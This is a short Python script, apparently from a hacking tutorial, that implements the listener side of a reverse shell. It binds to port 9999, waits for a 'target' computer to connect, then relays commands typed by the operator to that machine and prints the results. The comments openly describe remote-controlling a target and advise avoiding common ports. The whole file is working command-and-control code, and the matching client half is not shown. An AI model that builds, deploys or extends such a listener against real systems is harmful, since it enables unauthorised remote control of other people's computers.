##
##

import socket
import sys

# socket to allow 2 computers to connect
def create_socket():
	try:
                global host
                global port
                global s
                host = ''
                port = 9999
                # don't use common ports like 80, 3389

                s = socket.socket() # actual conversation between server and client
	except socket.error as msg:
		print("Error creating socket: " + str(msg))

# binds socket to port and wait for connection from client/target
def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to port: " + str(port))
		s.bind((host, port)) # host: usually an IP address, but since we listening to our own machine, it is blank
		s.listen(5) # listen allows server to accept connections, number 5 is number of bad connections it will take before refusing
	except socket.error as msg:
		print("Error binding socket to port: " + str(msg) + "\n" + "Retrying...")
		socket_bind() # recursion, keeps trying if error happens

# establish connection with client (socket must be listening for connections)
def socket_accept():
	conn, address = s.accept()
	print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
	send_commands(conn)
	conn.close()

# sends commands to target/client computer to remote-control it
def send_commands(conn):
	while True: # infinite loop for connection to stay constant
		cmd = input() # cmd = command we type into terminal to send to client
		
		# whatever we type into command line and when running/storing commands is of byte type
		# whenever we want to send across network, need to be of byte type
		# to print out for user, need to be changed to string
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0: # check that the command is not empty, otherwise do not send across network
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8") # 1024 is buffer size, utf-8 to convert to normal string
			print(client_response, end="") # default end = '\n', change it to '' so don't give new line at the end 

def main():
	create_socket()
	socket_bind()
	socket_accept() # no need send_commands as this function calls that when called

main()

##
##
